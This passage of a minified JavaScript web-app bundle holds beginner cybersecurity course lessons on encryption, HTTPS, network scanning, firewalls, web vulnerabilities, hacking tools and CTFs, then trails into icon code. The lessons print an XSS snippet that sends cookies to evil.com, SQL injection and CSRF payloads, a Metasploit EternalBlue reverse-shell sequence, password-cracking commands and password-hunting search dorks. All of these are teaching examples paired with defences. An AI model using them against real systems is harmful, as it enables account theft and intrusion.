Alice ──[Encrypt]──→ Ciphertext ──[Decrypt]──→ Bob
         ↑                                      ↑
    Uses same key                          Uses same key
\`\`\`

Modern symmetric algorithms:
- **AES** (Advanced Encryption Standard) — The gold standard
- **ChaCha20** — Fast, used in HTTPS

### Asymmetric Encryption (Public Key)

TWO different keys — a public key and a private key:

\`\`\`
Bob has:
  🔑 Public Key  (shared with everyone)
  🗝️ Private Key (kept secret!)

Alice wants to send Bob a message:
  1. Alice encrypts with Bob's PUBLIC key
  2. Only Bob's PRIVATE key can decrypt it!
\`\`\`

\`\`\`
Alice: "Hey Bob!" 
  → Encrypt with Bob's 🔑 Public Key
  → "x8k2m9p..."
  → Send to Bob

Bob receives: "x8k2m9p..."
  → Decrypt with 🗝️ Private Key  
  → "Hey Bob!"

Hacker intercepts: "x8k2m9p..."
  → Has no private key
  → Can't decrypt! 🔒
\`\`\`

### Real-World Uses

| Where | Encryption Used |
|-------|----------------|
| HTTPS websites | TLS (asymmetric + symmetric) |
| WhatsApp | Signal Protocol (end-to-end) |
| Bitcoin | Elliptic Curve Cryptography |
| Wi-Fi (WPA3) | AES encryption |
| File storage | AES-256 |

<tip>
💡 When you see HTTPS, your browser and the server did an asymmetric key exchange, then switched to faster symmetric encryption for the actual data!
</tip>

### Hashing vs Encryption

\`\`\`
Encryption: Plaintext ←→ Ciphertext (reversible!)
Hashing:    Plaintext  →  Hash      (one-way only!)
\`\`\`

Hashing is used for passwords — the website never needs to get your password back, just check if it matches!

Understanding encryption is understanding the backbone of internet security! 🔐
          `},{id:"4-2",title:"HTTPS & Secure Communication",duration:"10 min",content:`
## How HTTPS Keeps You Safe 🔒

Every time you visit a website with 🔒, encryption is protecting you!

### The TLS Handshake

When you visit https://google.com:

\`\`\`
1. YOUR BROWSER → "Hello! I want a secure connection"
2. GOOGLE → "Here's my certificate + public key" 📜
3. YOUR BROWSER → Verifies certificate is legit
4. YOUR BROWSER → Generates a session key
5. YOUR BROWSER → Encrypts session key with Google's 
                  public key, sends it
6. GOOGLE → Decrypts with private key
7. BOTH → Now share the same session key!
8. ALL DATA → Encrypted with session key 🔒
\`\`\`

### Certificates — Proof of Identity

A certificate says: "I am really google.com"

\`\`\`
Certificate for: google.com
Issued by: Google Trust Services (CA)
Valid: Jan 2024 - Apr 2024
Public Key: [included]
Signature: [CA signed this]
\`\`\`

**Certificate Authorities (CAs)** are trusted organizations that verify identities. Your browser comes with a list of trusted CAs.

### What Happens Without HTTPS

On public Wi-Fi with HTTP:

\`\`\`
You → "My password is hunter2" → Wi-Fi → Website
                                   ↑
                              Hacker sees:
                         "My password is hunter2" 😱

With HTTPS:
You → "x8k2m9p4..." → Wi-Fi → Website
                         ↑
                    Hacker sees:
                  "x8k2m9p4..." 🤷
\`\`\`

### Man-in-the-Middle (MITM) Attack

\`\`\`
Normal:
You ←──────────→ Google

MITM Attack:
You ←────→ Hacker ←────→ Google
           (reads everything!)
\`\`\`

HTTPS prevents this because the hacker can't forge Google's certificate!

### Check a Site's Certificate

Click the 🔒 in your browser:
1. See who issued the certificate
2. Check if it's valid
3. View the encryption details

\`\`\`bash
# Check certificate from terminal
openssl s_client -connect google.com:443 -brief

# See certificate details
echo | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -text
\`\`\`

### End-to-End Encryption (E2EE)

Apps like Signal and WhatsApp use E2EE:

\`\`\`
Regular encryption:
You → [Encrypted] → Server [DECRYPTED] → [Encrypted] → Friend
                     Server can read! 😰

End-to-End encryption:
You → [Encrypted] → Server [still encrypted] → Friend
                     Server can't read! ✅
\`\`\`

Only you and the recipient have the keys!

### VPNs — Your Encrypted Tunnel

\`\`\`
Without VPN:
You → ISP (sees everything) → Internet
      Your ISP knows every site you visit!

With VPN:
You → [Encrypted Tunnel] → VPN Server → Internet
      ISP sees only encrypted data!
      But... VPN server sees your traffic
\`\`\`

<warning>
⚠️ VPNs move trust, not remove it. You're trusting the VPN provider instead of your ISP. Choose carefully!
</warning>

<tip>
💡 Free VPNs often sell your data. If you're not paying, YOU are the product!
</tip>

Now you understand how encryption protects your data online! 🛡️
          `}]},{id:5,title:"Network Security",description:"Defend and analyze networks",lessons:[{id:"5-1",title:"Network Scanning & Reconnaissance",duration:"14 min",content:`
## Seeing What's on Your Network 🔍

Before you can defend a network, you need to know what's on it!

### What is Reconnaissance?

The first step in both hacking AND defending:
1. **What devices are connected?**
2. **What ports are open?**
3. **What services are running?**

### Nmap — The Network Scanner

**Nmap** is the most famous security scanning tool:

\`\`\`bash
# Scan your local network (find all devices)
nmap -sn 192.168.1.0/24

# Output:
# Host is up: 192.168.1.1    (Router)
# Host is up: 192.168.1.100  (Your PC)
# Host is up: 192.168.1.101  (Phone)
# Host is up: 192.168.1.105  (Smart TV)
\`\`\`

### Port Scanning

\`\`\`bash
# Scan a specific device for open ports
nmap 192.168.1.1

# Output:
# PORT    STATE  SERVICE
# 22/tcp  open   ssh
# 80/tcp  open   http
# 443/tcp open   https
# 8080/tcp open  http-proxy
\`\`\`

### Understanding Port States

| State | Meaning |
|-------|---------|
| **open** | Service is listening (accessible!) |
| **closed** | Port exists but no service |
| **filtered** | Firewall is blocking the scan |

### Wireshark — See ALL Network Traffic

**Wireshark** captures and displays every packet on your network:

\`\`\`
No. | Time    | Source          | Dest            | Protocol | Info
1   | 0.000   | 192.168.1.100  | 142.250.80.46  | TCP      | SYN
2   | 0.012   | 142.250.80.46  | 192.168.1.100  | TCP      | SYN-ACK
3   | 0.013   | 192.168.1.100  | 142.250.80.46  | TCP      | ACK
4   | 0.014   | 192.168.1.100  | 142.250.80.46  | TLS      | Client Hello
\`\`\`

### What You Can See in Wireshark

\`\`\`
✅ DNS queries (what sites devices visit)
✅ Unencrypted HTTP traffic
✅ Connection patterns
✅ Suspicious traffic
❌ HTTPS content (encrypted!)
❌ VPN traffic content
\`\`\`

### Netstat — Check Your Own Connections

\`\`\`bash
# See all active connections on your computer
netstat -an

# Windows: see which programs have connections
netstat -ab

# Mac/Linux: with process IDs
netstat -tulpn
# or
ss -tulpn
\`\`\`

<tip>
💡 If you see connections to IPs you don't recognize, it could be malware phoning home!
</tip>

### DNS Lookup Tools

\`\`\`bash
# Find IP of a domain
nslookup example.com

# Detailed DNS info
dig example.com

# Reverse lookup (IP → domain)
nslookup 8.8.8.8
# Result: dns.google
\`\`\`

### Traceroute — Follow the Path

See every router between you and a destination:

\`\`\`bash
# Mac/Linux
traceroute google.com

# Windows
tracert google.com

# Output:
# 1  192.168.1.1      (your router)
# 2  10.0.0.1         (ISP)
# 3  72.14.215.85     (backbone)
# 4  142.250.80.46    (Google!)
\`\`\`

### Practice: Scan Your Home Network

\`\`\`bash
# 1. Find your IP
ifconfig  # or ipconfig on Windows

# 2. Scan your network
nmap -sn 192.168.1.0/24

# 3. Count devices - do you recognize them all?
# Unknown devices = potential security issue!
\`\`\`

<warning>
⚠️ Only scan networks you OWN or have permission to scan. Scanning others' networks can be illegal!
</warning>

Knowing your network is the first step to defending it! 🔍
          `},{id:"5-2",title:"Firewalls & Defense",duration:"10 min",content:`
## Building Your Fortress 🏰

Now that you can see what's on a network, let's protect it!

### What is a Firewall?

A firewall is a gatekeeper that decides what traffic gets in and out:

\`\`\`
Internet → [FIREWALL] → Your Network
                ↓
        Rules decide:
        ✅ Allow web traffic (80, 443)
        ✅ Allow email (25, 587)
        ❌ Block everything else
\`\`\`

### Firewall Rules

Rules follow this format:
\`\`\`
ACTION  DIRECTION  PROTOCOL  PORT  SOURCE/DEST

ALLOW   INBOUND    TCP       443   Any → Server
ALLOW   OUTBOUND   TCP       80    Server → Any  
DENY    INBOUND    TCP       22    Any → Server
DENY    INBOUND    ALL       ALL   Any → Any (default)
\`\`\`

### Linux Firewall (iptables/ufw)

\`\`\`bash
# UFW (Uncomplicated Firewall) - easy mode!

# Enable firewall
sudo ufw enable

# Allow web server
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Allow SSH from specific IP only
sudo ufw allow from 192.168.1.100 to any port 22

# Block everything else (default)
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Check rules
sudo ufw status
\`\`\`

### Windows Firewall

\`\`\`
Settings → Windows Security → Firewall
- Domain networks: ON
- Private networks: ON
- Public networks: ON (most restrictive!)
\`\`\`

### Types of Firewalls

| Type | What It Does |
|------|-------------|
| **Packet Filter** | Checks each packet against rules |
| **Stateful** | Tracks connection states |
| **Application** | Understands HTTP, DNS, etc. |
| **Next-Gen (NGFW)** | Deep inspection + AI |

### Intrusion Detection (IDS) vs Prevention (IPS)

\`\`\`
IDS: "Hey, I saw something suspicious!" (alerts only)
IPS: "Suspicious traffic BLOCKED!" (takes action)
\`\`\`

### Network Segmentation

Don't put everything on one network!

\`\`\`
BAD (flat network):
[Server] - [PC] - [Smart TV] - [IoT Camera]
  ↑ If one gets hacked, hacker has access to ALL

GOOD (segmented):
[Server VLAN] | [Office VLAN] | [IoT VLAN]
  ↑ Hacked IoT camera can't reach the server!
\`\`\`

### Wi-Fi Security

| Protocol | Security | Status |
|----------|----------|--------|
| WEP | ❌ Broken | Never use |
| WPA | ⚠️ Weak | Avoid |
| WPA2 | ✅ Good | Current standard |
| WPA3 | ✅✅ Best | Use if available |

\`\`\`
Your Wi-Fi Checklist:
☐ WPA2 or WPA3 enabled
☐ Strong password (not "password123")
☐ Default router admin password changed
☐ WPS disabled (it's hackable!)
☐ Guest network for visitors
☐ Router firmware up to date
\`\`\`

<tip>
💡 Your router's admin page is usually at 192.168.1.1 or 192.168.0.1 — log in and check your security settings!
</tip>

### Defense in Depth

Don't rely on just one defense:

\`\`\`
Layer 1: Firewall (network perimeter)
Layer 2: Antivirus (endpoint protection)
Layer 3: Updates/Patches (close vulnerabilities)
Layer 4: Strong passwords + 2FA (access control)
Layer 5: Training (human awareness)
Layer 6: Backups (recovery plan)
\`\`\`

Multiple layers = much harder to hack! 🏰
          `}]},{id:6,title:"Web Security",description:"How websites get hacked",lessons:[{id:"6-1",title:"Common Web Vulnerabilities",duration:"14 min",content:`
## How Websites Get Hacked 🌐

Websites are one of the biggest attack targets. Let's learn how they break!

### SQL Injection (SQLi)

The #1 web vulnerability for decades!

Normal login:
\`\`\`sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
\`\`\`

Hacker enters this as username:
\`\`\`
' OR '1'='1' --
\`\`\`

The query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
\`\`\`

\`'1'='1'\` is always true → Returns ALL users → Hacker is logged in! 😱

### SQL Injection - Data Theft

\`\`\`sql
-- Hacker enters in search box:
' UNION SELECT username, password FROM users --

-- Returns all usernames and passwords!
\`\`\`

### Defense Against SQLi

\`\`\`python
# BAD - Vulnerable to SQL injection!
query = f"SELECT * FROM users WHERE name = '{user_input}'"

# GOOD - Parameterized query (safe!)
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (user_input,))
\`\`\`

<warning>
⚠️ NEVER put user input directly into SQL queries! Always use parameterized queries.
</warning>

### Cross-Site Scripting (XSS)

Injecting JavaScript into a website:

\`\`\`html
<!-- Hacker posts this as a comment: -->
<script>
  document.location = 'https://evil.com/steal?cookie=' 
    + document.cookie;
<\/script>

<!-- When other users view the comment, 
     their cookies get stolen! -->
\`\`\`

### Types of XSS

| Type | How It Works |
|------|-------------|
| **Stored XSS** | Malicious code saved in database (comments, profiles) |
| **Reflected XSS** | Code in URL, reflected back by server |
| **DOM XSS** | Manipulates page JavaScript directly |

### Defense Against XSS

\`\`\`python
# Escape HTML special characters
import html
safe_input = html.escape(user_input)
# <script> becomes &lt;script&gt; (won't execute!)
\`\`\`

\`\`\`
Content-Security-Policy: script-src 'self'
↑ Only allow scripts from your own domain!
\`\`\`

### Cross-Site Request Forgery (CSRF)

Trick logged-in users into performing actions:

\`\`\`html
<!-- On evil website: -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- Your browser sends the request WITH your 
     bank session cookie! -->
\`\`\`

Defense: **CSRF tokens** — random values that attackers can't guess.

### Insecure Direct Object References (IDOR)

\`\`\`
Your profile: https://site.com/user/profile?id=123
Change to:    https://site.com/user/profile?id=124
→ See someone else's profile! 😱
\`\`\`

Defense: Always check authorization on the server!

### The OWASP Top 10

The most critical web security risks:

1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQLi, XSS)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Data Integrity Failures
9. Security Logging Failures
10. Server-Side Request Forgery

<tip>
💡 The OWASP Top 10 is updated regularly and is the gold standard for web security awareness!
</tip>

### Practice: Try Hacking (Legally!)

Safe practice environments:
- **DVWA** (Damn Vulnerable Web App)
- **HackTheBox** (online challenges)
- **TryHackMe** (guided learning)
- **PortSwigger Web Security Academy** (free!)

These are LEGAL practice environments designed to be hacked! 🎯
          `},{id:"6-2",title:"Securing Your Digital Life",duration:"10 min",content:`
## Your Personal Security Checklist ✅

Let's apply everything you've learned to protect YOUR digital life!

### Browser Security

\`\`\`
✅ Use HTTPS Everywhere (or browser's built-in)
✅ Block third-party cookies
✅ Use ad blocker (uBlock Origin)
✅ Don't save passwords in browser
   (use a password manager instead!)
✅ Keep browser updated
✅ Review extensions (remove unused ones)
\`\`\`

### Phone Security

\`\`\`
✅ Enable screen lock (PIN, fingerprint, face)
✅ Keep OS and apps updated
✅ Only install apps from official stores
✅ Review app permissions
   (Does a flashlight need your contacts? NO!)
✅ Enable "Find My Device"
✅ Encrypt your phone (usually on by default)
\`\`\`

### Social Media Security

\`\`\`
✅ Make profiles private
✅ Don't share:
   - Full birthday
   - Home address
   - School/work location in real-time
   - Vacation plans ("We're away for 2 weeks!")
✅ Review tagged photos
✅ Enable login notifications
✅ Check connected apps regularly
\`\`\`

### Email Security

\`\`\`
✅ Use unique password + 2FA
✅ Don't click links in suspicious emails
✅ Check sender address carefully
✅ Don't open unexpected attachments
✅ Use separate emails:
   - Personal email
   - Shopping/accounts email
   - Throwaway for signups
\`\`\`

### Wi-Fi Security

\`\`\`
✅ Never use public Wi-Fi for banking
✅ Use VPN on public networks
✅ Forget networks when done
✅ Don't auto-connect to open networks
✅ Use your phone hotspot instead
\`\`\`

<warning>
⚠️ Public Wi-Fi is NEVER safe! Anyone on the same network can potentially see your traffic.
</warning>

### Backup Strategy: 3-2-1 Rule

\`\`\`
3 copies of your data
2 different types of storage
1 offsite copy

Example:
1. Your computer (original)
2. External hard drive (local backup)
3. Cloud storage (offsite backup)
\`\`\`

### Software Updates

\`\`\`
Updates often fix security vulnerabilities:

"Critical security patch available"
→ Install it NOW, not later!

Auto-updates: ENABLE THEM
- Operating system
- Browser
- Phone apps
- Router firmware
\`\`\`

### If You Get Hacked

\`\`\`
1. Change passwords IMMEDIATELY
   (start with email!)
2. Enable 2FA on everything
3. Check for unauthorized access
4. Scan for malware
5. Notify affected services
6. Monitor financial accounts
7. Learn from it!
\`\`\`

<tip>
💡 Check if your email has been in a breach: haveibeenpwned.com — It's free and run by a security researcher!
</tip>

### Your Security Score

Rate yourself:
\`\`\`
[ ] Unique passwords for every account
[ ] Password manager in use
[ ] 2FA on email and banking
[ ] Phone has screen lock
[ ] Browser is up to date
[ ] Don't click suspicious links
[ ] Backups are current
[ ] Wi-Fi uses WPA2/WPA3
[ ] Social media is private

7-9: 🟢 Great security!
4-6: 🟡 Getting there
0-3: 🔴 You're at risk!
\`\`\`

Security is a journey, not a destination! 🛡️
          `}]},{id:7,title:"Ethical Hacking Tools",description:"Tools of the trade",lessons:[{id:"7-1",title:"Kali Linux & Hacking Tools",duration:"12 min",content:`
## The Hacker's Toolkit 🧰

Professional security researchers use specialized tools. Let's explore them!

### Kali Linux

The #1 operating system for ethical hacking:

\`\`\`
What: Linux distro pre-loaded with 600+ security tools
Where: kali.org (free!)
How: Run in VirtualBox or as USB boot
\`\`\`

### Setting Up Kali (In VirtualBox)

\`\`\`bash
# 1. Download VirtualBox (free)
#    virtualbox.org

# 2. Download Kali Linux VM image
#    kali.org/get-kali/

# 3. Import into VirtualBox
#    File → Import Appliance → Select .ova file

# 4. Start it up!
#    Default login: kali / kali
\`\`\`

### Essential Tools Overview

| Tool | Category | What It Does |
|------|----------|-------------|
| **Nmap** | Scanning | Network/port scanning |
| **Wireshark** | Analysis | Packet capture & analysis |
| **Burp Suite** | Web | Web app testing |
| **Metasploit** | Exploitation | Vulnerability exploitation |
| **John the Ripper** | Passwords | Password cracking |
| **Hashcat** | Passwords | GPU-accelerated cracking |
| **Aircrack-ng** | Wireless | Wi-Fi security testing |
| **Hydra** | Passwords | Online brute force |
| **SQLMap** | Web | Automated SQL injection |
| **Nikto** | Web | Web server scanner |

### Nmap Deep Dive

\`\`\`bash
# Basic scan
nmap target.com

# Scan all ports
nmap -p- target.com

# Detect operating system
nmap -O target.com

# Detect services and versions
nmap -sV target.com

# Aggressive scan (OS + services + scripts)
nmap -A target.com

# Scan for vulnerabilities
nmap --script vuln target.com
\`\`\`

### Burp Suite — Web App Testing

\`\`\`
Your Browser → [Burp Proxy] → Website
                    ↓
        See & modify EVERY request!

1. Intercept login requests
2. Modify parameters
3. Replay requests
4. Find hidden endpoints
\`\`\`

### Metasploit Framework

The exploitation Swiss army knife:

\`\`\`bash
# Start Metasploit
msfconsole

# Search for exploits
search apache
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
exploit
\`\`\`

<warning>
⚠️ ONLY use these tools on systems you have WRITTEN PERMISSION to test! Unauthorized use is a crime.
</warning>

### Password Cracking Tools

\`\`\`bash
# John the Ripper - crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat - GPU-accelerated (much faster!)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
\`\`\`

### Practice Platforms

Safe, legal places to practice:

\`\`\`
🎯 TryHackMe.com     — Guided rooms, beginner-friendly
🎯 HackTheBox.com    — Realistic challenges
🎯 PicoCTF.org       — Student CTF competitions
🎯 OverTheWire.org   — Wargames (start with Bandit)
🎯 DVWA              — Practice web hacking locally
\`\`\`

<tip>
💡 Start with TryHackMe — it has learning paths from absolute beginner to advanced! And it's free.
</tip>

### Career Paths in Cybersecurity

| Role | What They Do | Avg Salary |
|------|-------------|-----------|
| Security Analyst | Monitor & respond to threats | $80K |
| Penetration Tester | Hack companies (legally!) | $100K |
| Security Engineer | Build secure systems | $120K |
| Bug Bounty Hunter | Find bugs for rewards | Varies ($$$) |
| CISO | Lead security strategy | $200K+ |

### Certifications to Consider

\`\`\`
Beginner:
  CompTIA Security+
  CEH (Certified Ethical Hacker)

Intermediate:
  OSCP (Offensive Security Certified Professional)
  CySA+

Advanced:
  CISSP
  OSCE
\`\`\`

You now know the tools of the trade! Use them wisely! 🛡️
          `}]},{id:8,title:"Capture The Flag",description:"Put your skills to the test",lessons:[{id:"8-1",title:"Your First CTF Challenge",duration:"15 min",content:`
## Capture The Flag! 🏁

**CTF (Capture The Flag)** competitions are how hackers test their skills!

### What is a CTF?

Teams or individuals solve security challenges to find hidden "flags":

\`\`\`
Challenge: "Find the hidden message in this website"
You hack → find → flag{y0u_f0und_th3_s3cr3t}
Submit flag → earn points! 🏆
\`\`\`

### CTF Categories

| Category | What You Do |
|----------|-------------|
| **Web** | Hack websites (XSS, SQLi, etc.) |
| **Crypto** | Break encryption |
| **Forensics** | Analyze files, memory dumps |
| **Reversing** | Reverse engineer programs |
| **Pwn** | Exploit binary programs |
| **OSINT** | Find info from public sources |
| **Misc** | Everything else! |

### Challenge 1: Decode This!

\`\`\`
Find the flag:
ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259
\`\`\`

Hint: It's Base64 encoded!

\`\`\`bash
echo "ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259" | base64 -d
# Output: flag{base64_is_not_encryption}
\`\`\`

<tip>
💡 Base64 is encoding, NOT encryption! Anyone can decode it. It's used for data transport, not security.
</tip>

### Challenge 2: Hidden in Plain Sight

\`\`\`html
<!-- Look at a website's source code -->
<!-- Right-click → View Page Source -->
<!-- Or press Ctrl+U -->

<html>
<head><title>Nothing here...</title></head>
<body>
  <p>This page is empty.</p>
  <!-- flag{always_check_the_source} -->
</body>
</html>
\`\`\`

Developers sometimes leave secrets in HTML comments!

### Challenge 3: HTTP Headers

\`\`\`bash
# Check response headers
curl -I https://challenge.ctf.com

# HTTP/1.1 200 OK
# Content-Type: text/html
# X-Secret-Flag: flag{headers_hide_secrets}
# Server: nginx
\`\`\`

### Challenge 4: robots.txt

\`\`\`bash
# Websites tell search engines what NOT to index
curl https://challenge.ctf.com/robots.txt

# User-agent: *
# Disallow: /secret-admin-panel/
# Disallow: /flag.txt

# Now visit /flag.txt!
curl https://challenge.ctf.com/flag.txt
# flag{robots_txt_is_not_security}
\`\`\`

### Challenge 5: Caesar Cipher Crack

\`\`\`
Encrypted: synt{pnrfne_pvcure_vf_jrnx}
\`\`\`

\`\`\`python
# Try all 26 shifts
def caesar_crack(text):
    for shift in range(26):
        result = ""
        for char in text:
            if char.isalpha():
                base = ord('a') if char.islower() else ord('A')
                result += chr((ord(char) - base + shift) % 26 + base)
            else:
                result += char
        if "flag" in result.lower():
            print(f"Shift {shift}: {result}")

caesar_crack("synt{pnrfne_pvcure_vf_jrnx}")
# Shift 13: flag{caesar_cipher_is_weak}
\`\`\`

This is **ROT13** — a Caesar cipher with shift of 13!

### OSINT Challenge

Find information using only public sources:

\`\`\`
Task: "What is the CEO's email at ExampleCorp?"

Sources to check:
1. Company website (About page)
2. LinkedIn profiles
3. GitHub repositories (check commits!)
4. Google dorking: "ExampleCorp" "CEO" "@"
5. WHOIS records for their domain
6. Cached pages
\`\`\`

### Google Dorking

Advanced Google searches for finding exposed data:

\`\`\`
site:example.com filetype:pdf    → PDFs on a site
intitle:"index of" passwords     → Exposed directories
inurl:admin login                → Admin pages
"password" filetype:log          → Log files with passwords
\`\`\`

<warning>
⚠️ Google dorking to find vulnerabilities in sites you don't own can be illegal. Only use on CTF challenges or with permission!
</warning>

### Where to Play CTFs

\`\`\`
🏁 PicoCTF.org          — Best for beginners!
🏁 CTFtime.org          — Calendar of CTF events
🏁 TryHackMe.com        — Guided challenges
🏁 HackTheBox.com       — Real-world scenarios
🏁 OverTheWire (Bandit)  — Linux command challenges
🏁 CryptoHack.org       — Cryptography challenges
\`\`\`

### Start Your Journey!

\`\`\`
1. Sign up on PicoCTF or TryHackMe
2. Start with the easiest challenges
3. Google when you're stuck (that's how you learn!)
4. Join a team or community
5. Practice regularly
6. Enter real CTF competitions!
\`\`\`

<tip>
💡 The cybersecurity community is incredibly helpful. Join Discord servers, Reddit's r/netsec, and ask questions!
</tip>

Congratulations! You've completed the Cybersecurity course! 🎉

You now have the foundation to:
- Protect yourself online
- Understand how attacks work
- Use security tools ethically
- Start your cybersecurity journey

Stay curious, stay ethical, and keep learning! 🛡️🚀
          `}]}]};const Th=(...z)=>z.filter((B,X,m)=>!!B&&B.trim()!==""&&m.indexOf(B)===X).join(" ").trim();const Xy=z=>z.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase();const Qy=z=>z.replace(/^([A-Z])|[\s-_]+(\w)/g,(B,X,m)=>m?m.toUpperCase():X.toLowerCase());const oh=z=>{const B=Qy(z);return B.charAt(0).toUpperCase()+B.slice(1)};var Zy={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const Ky=z=>{for(const B in z)if(B.startsWith("aria-")||B==="role"||B==="title")return!0;return!1};const Jy=F.forwardRef(({color:z="currentColor",size:B=24,strokeWidth:X=2,absoluteStrokeWidth:m,className:k="",children:W,iconNode:ce,...Me},q)=>F.createElement("svg",{ref:q,...Zy,width:B,height:B,stroke:z,strokeWidth:m?Number(X)*24/Number(B):X,className:Th("lucide",k),...!W&&!Ky(Me)&&{"aria-hidden":"true"},...Me},[...ce.map(([C,ue])=>F.createElement(C,ue)),...Array.isArray(W)?W:[W]]));const le=(z,B)=>{const X=F.forwardRef(({className:m,...k},W)=>F.createElement(Jy,{ref:W,iconNode:B,className:Th(`lucide-${Xy(oh(z))}`,`lucide-${z}`,m),...k}));return X.displayName=oh(z),X};const Wy=[["rect",{width:"20",height:"5",x:"2",y:"3",rx:"1",key:"1wp1u1"}],["path",{d:"M4 8v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8",key:"1s80jp"}],["path",{d:"M10 12h4",key:"a56b0p"}]],$y=le("archive",Wy);const Fy=[["path",{d:"M12 5v14",key:"s699le"}],["path",{d:"m19 12-7 7-7-7",key:"1idqje"}]],rh=le("arrow-down",Fy);const Iy=[["path",{d:"m5 12 7-7 7 7",key:"hav0vg"}],["path",{d:"M12 19V5",key:"x0mq9r"}]],fh=le("arrow-up",Iy);const Py=[["path",{d:"M12 7v14",key:"1akyts"}],["path",{d:"M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z",key:"ruj8y"}]],ni=le("book-open",Py);const ep=[["path",{d:"M3 3v16a2 2 0 0 0 2 2h16",key:"c24i48"}],["path",{d:"M18 17V9",key:"2bz60n"}],["path",{d:"M13 17V5",key:"1frdt8"}],["path",{d:"M8 17v-3",key:"17ska0"}]],dh=le("chart-column",ep);const tp=[["path",{d:"m6 9 6 6 6-6",key:"qrunsl"}]],lp=le("chevron-down",tp);const ap=[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]],ii=le("chevron-right",ap);const np=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m9 12 2 2 4-4",key:"dzmm74"}]],tl=le("circle-check",np);const ip=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]],no=le("circle-x",ip);const sp=[["path",{d:"M12 6v6l4 2",key:"mmk7yg"}],["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}]],io=le("clock",sp);const cp=[["path",{d:"m16 18 6-6-6-6",key:"eg8j8"}],["path",{d:"m8 6-6 6 6 6",key:"ppft3o"}]],$u=le("code",cp);const up=[["rect",{width:"14",height:"14",x:"8",y:"8",rx:"2",ry:"2",key:"17jyea"}],["path",{d:"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",key:"zix9uf"}]],Fu=le("copy",up);const op=[["path",{d:"M12 15V3",key:"m9g1x1"}],["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}],["path",{d:"m7 10 5 5 5-5",key:"brsn70"}]],hh=le("download",op);const rp=[["path",{d:"M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49",key:"ct8e1f"}],["path",{d:"M14.084 14.158a3 3 0 0 1-4.242-4.242",key:"151rxh"}],["path",{d:"M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143",key:"13bj9a"}],["path",{d:"m2 2 20 20",key:"1ooewy"}]],fp=le("eye-off",rp);const dp=[["path",{d:"M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",key:"1nclc0"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]],Iu=le("eye",dp);const hp=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M10 12.5 8 15l2 2.5",key:"1tg20x"}],["path",{d:"m14 12.5 2 2.5-2 2.5",key:"yinavb"}]],mp=le("file-code",hp);const yp=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M12 18v-6",key:"17g6i2"}],["path",{d:"m9 15 3 3 3-3",key:"1npd3o"}]],pp=le("file-down",yp);const gp=[["path",{d:"M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z",key:"1oefj6"}],["path",{d:"M14 2v5a1 1 0 0 0 1 1h5",key:"wfsgrz"}],["path",{d:"M10 9H8",key:"b1mrlr"}],["path",{d:"M16 13H8",key:"t4e002"}],["path",{d:"M16 17H8",key:"z1uh3a"}]],mh=le("file-text",gp);const vp=[["path",{d:"M20 10a1 1 0 0 0 1-1V6a1 1 0 0 0-1-1h-2.5a1 1 0 0 1-.8-.4l-.9-1.2A1 1 0 0 0 15 3h-2a1 1 0 0 0-1 1v5a1 1 0 0 0 1 1Z",key:"hod4my"}],["path",{d:"M20 21a1 1 0 0 0 1-1v-3a1 1 0 0 0-1-1h-2.9a1 1 0 0 1-.88-.55l-.42-.85a1 1 0 0 0-.92-.6H13a1 1 